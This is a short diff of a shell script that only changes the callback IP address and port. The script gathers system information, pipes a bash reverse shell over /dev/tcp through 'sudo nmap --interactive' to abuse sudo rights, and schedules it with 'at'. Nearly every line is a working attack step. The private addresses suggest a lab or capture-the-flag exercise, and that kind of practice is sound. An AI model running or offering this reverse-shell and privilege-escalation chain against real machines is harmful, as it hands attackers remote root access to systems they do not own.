@@ -2,5 +2,5 @@ id
 whoami
 uname -a
 echo "Using at to schedule reverse shell execution.."
-echo 'echo "!/bin/bash -i >& /dev/tcp/192.168.1.10/4455 0>&1"|sudo nmap --interactive' > /tmp/exec-rce.txt
+echo 'echo "!/bin/bash -i >& /dev/tcp/10.10.12.254/9999 0>&1"|sudo nmap --interactive' > /tmp/exec-rce.txt
 at now +1 minutes < /tmp/exec-rce.txt
